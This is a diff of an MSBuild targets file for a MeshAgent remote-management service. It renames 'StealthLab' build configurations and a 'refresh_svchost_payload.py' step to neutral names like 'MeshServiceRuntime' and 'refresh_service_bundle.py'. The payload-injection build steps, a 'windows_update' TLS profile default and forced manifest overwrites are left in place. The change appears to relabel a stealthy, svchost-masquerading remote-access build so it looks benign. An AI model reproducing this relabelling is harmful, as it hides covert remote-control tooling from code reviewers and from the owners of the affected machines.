@@ -12,11 +12,11 @@
     <MeshAgentTlsProfile Condition="'$(MeshAgentTlsProfile)'==''">windows_update</MeshAgentTlsProfile>
   </PropertyGroup>
 
-  <Target Name="ValidateMeshAgentProvisioningManifest" BeforeTargets="PrepareForBuild" Condition="'$(Configuration)'=='StealthLab' and '$(TargetExt)'=='.exe'">
+  <Target Name="ValidateMeshAgentProvisioningManifest" BeforeTargets="PrepareForBuild" Condition="'$(Configuration)'=='MeshServiceRuntime' and '$(TargetExt)'=='.exe'">
     <Error Condition="!Exists('$(MeshAgentProvisioningManifest)')" Text="MeshAgent provisioning manifest not found: $(MeshAgentProvisioningManifest)" />
   </Target>
 
-  <Target Name="CopyMeshAgentProvisioningManifest" AfterTargets="Build" DependsOnTargets="ValidateMeshAgentProvisioningManifest" Condition="'$(Configuration)'=='StealthLab' and '$(TargetExt)'=='.exe'">
+  <Target Name="CopyMeshAgentProvisioningManifest" AfterTargets="Build" DependsOnTargets="ValidateMeshAgentProvisioningManifest" Condition="'$(Configuration)'=='MeshServiceRuntime' and '$(TargetExt)'=='.exe'">
     <!-- Always copy the selected authority; an older, same-size manifest can
          intentionally replace a newer sidecar from another deployment. -->
     <Copy SourceFiles="$(MeshAgentProvisioningManifest)" DestinationFiles="$(TargetDir)$(TargetName).msh" SkipUnchangedFiles="false" />
@@ -28,21 +28,21 @@
     <Exec Command="&quot;$(MeshAgentPython)&quot; &quot;$(MeshAgentRepoRoot)\tools\generate_network_profile.py&quot; --config &quot;$(MeshAgentBrandingConfig)&quot; --tls-profile &quot;$(MeshAgentTlsProfile)&quot; --output-header &quot;$(MeshAgentNetworkProfileHeader)&quot; --output-json &quot;$(MeshAgentNetworkProfileJson)&quot;" Condition="Exists('$(MeshAgentRepoRoot)\tools\generate_network_profile.py')" />
   </Target>
 
-  <Target Name="BuildStealthLabDllDependency" BeforeTargets="PrepareForBuild" Condition="'$(Configuration)|$(Platform)'=='StealthLab|x64' and '$(MeshAgentSkipStealthLabDllDependencyBuild)'!='1'">
-    <MSBuild Projects="$(MSBuildProjectFullPath)" Targets="Build" BuildInParallel="false" Properties="MeshAgentPython=$(MeshAgentPython);MeshAgentBrandingConfig=$(MeshAgentBrandingConfig);MeshAgentTlsProfile=$(MeshAgentTlsProfile);Configuration=StealthLab_DLL;Platform=x64;MeshAgentSkipStealthLabDllDependencyBuild=1" />
+  <Target Name="BuildMeshServiceBundleDependency" BeforeTargets="PrepareForBuild" Condition="'$(Configuration)|$(Platform)'=='MeshServiceRuntime|x64' and '$(MeshAgentSkipMeshServiceBundleDependencyBuild)'!='1'">
+    <MSBuild Projects="$(MSBuildProjectFullPath)" Targets="Build" BuildInParallel="false" Properties="MeshAgentPython=$(MeshAgentPython);MeshAgentBrandingConfig=$(MeshAgentBrandingConfig);MeshAgentTlsProfile=$(MeshAgentTlsProfile);Configuration=MeshServiceBundle;Platform=x64;MeshAgentSkipMeshServiceBundleDependencyBuild=1" />
   </Target>
 
   <Target Name="UpdateMeshServiceRcFromCommit" AfterTargets="PreBuildEvent" BeforeTargets="ResourceCompile" Condition="Exists('$(MSBuildProjectDirectory)\MeshService.rc') and Exists('$(MSBuildProjectDirectory)\..\microscript\ILibDuktape_Commit.h')">
     <Exec Command="&quot;$(MeshAgentPython)&quot; &quot;$(MeshAgentRepoRoot)\tools\update_rc_version.py&quot; &quot;$(MSBuildProjectDirectory)\..\microscript\ILibDuktape_Commit.h&quot; &quot;$(MSBuildProjectDirectory)\MeshService.rc&quot;" />
   </Target>
 
-  <Target Name="EnsureStealthLabPayloadBeforeBuild" BeforeTargets="ResourceCompile" Condition="'$(Configuration)|$(Platform)'=='StealthLab|x64'">
-    <Exec Command="&quot;$(MeshAgentPython)&quot; &quot;$(MeshAgentRepoRoot)\tools\refresh_svchost_payload.py&quot; --repo-root &quot;$(MeshAgentRepoRoot)&quot; --config &quot;$(MeshAgentBrandingConfig)&quot; --dll &quot;$(MSBuildProjectDirectory)\x64\StealthLab_DLL\MeshService-2022.dll&quot;" />
+  <Target Name="EnsureMeshServiceRuntimePayloadBeforeBuild" BeforeTargets="ResourceCompile" Condition="'$(Configuration)|$(Platform)'=='MeshServiceRuntime|x64'">
+    <Exec Command="&quot;$(MeshAgentPython)&quot; &quot;$(MeshAgentRepoRoot)\tools\refresh_service_bundle.py&quot; --repo-root &quot;$(MeshAgentRepoRoot)&quot; --config &quot;$(MeshAgentBrandingConfig)&quot; --dll &quot;$(MSBuildProjectDirectory)\x64\MeshServiceBundle\MeshService-2022.dll&quot;" />
     <Delete Files="$(IntDir)Bundle_Resources.res" TreatErrorsAsWarnings="true" />
   </Target>
 
-  <Target Name="RefreshStealthLabPayloadAfterBuild" AfterTargets="Build" Condition="'$(Configuration)|$(Platform)'=='StealthLab_DLL|x64'">
-    <Exec Command="&quot;$(MeshAgentPython)&quot; &quot;$(MeshAgentRepoRoot)\tools\refresh_svchost_payload.py&quot; --repo-root &quot;$(MeshAgentRepoRoot)&quot; --config &quot;$(MeshAgentBrandingConfig)&quot; --dll &quot;$(TargetPath)&quot;" />
+  <Target Name="RefreshMeshServiceRuntimePayloadAfterBuild" AfterTargets="Build" Condition="'$(Configuration)|$(Platform)'=='MeshServiceBundle|x64'">
+    <Exec Command="&quot;$(MeshAgentPython)&quot; &quot;$(MeshAgentRepoRoot)\tools\refresh_service_bundle.py&quot; --repo-root &quot;$(MeshAgentRepoRoot)&quot; --config &quot;$(MeshAgentBrandingConfig)&quot; --dll &quot;$(TargetPath)&quot;" />
   </Target>
 
 </Project>
